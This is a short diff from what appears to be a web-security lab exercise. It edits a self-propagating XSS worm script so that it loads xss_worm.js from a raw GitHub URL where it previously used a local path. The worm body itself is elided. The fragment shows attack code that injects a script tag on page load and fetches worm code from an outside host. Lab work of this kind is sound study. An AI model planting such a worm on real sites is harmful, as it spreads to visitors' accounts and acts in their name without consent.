@@ -1,6 +1,6 @@
 <script type="text/javascript">
 window.onload = function() {
- var headerTag = "<script type=\"text/javascript\" src=\"/home/cs656/xss_worm.js\">";
+ var headerTag = "<script type=\"text/javascript\" src=\"https://raw.githubusercontent.com/FireITH-gh/XSS_Lab/refs/heads/main/xss_worm.js\">";
  var jsCode = ...;
  var tailTag = "</" + "script>";
  
